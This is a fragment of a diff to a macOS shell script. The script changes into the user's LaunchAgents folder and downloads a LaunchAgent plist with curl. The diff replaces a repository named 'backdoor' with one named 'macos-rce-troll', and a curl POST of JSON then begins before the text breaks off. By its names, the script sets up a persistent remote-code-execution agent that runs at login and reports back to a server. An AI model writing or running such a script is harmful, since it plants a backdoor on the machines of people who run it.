@@ -1,5 +1,5 @@
 cd ~/Library/LaunchAgents/
-curl -O "https://raw.githubusercontent.com/Wolfoverflow/backdoor/main/com.wolfoverflow.CodeExecutor.plist"
+curl -O "https://raw.githubusercontent.com/bowie-dev/macos-rce-troll/main/com.bowie.macosrcetroll.plist"
 cd ..
 curl -d '{                        
   "success": "true"
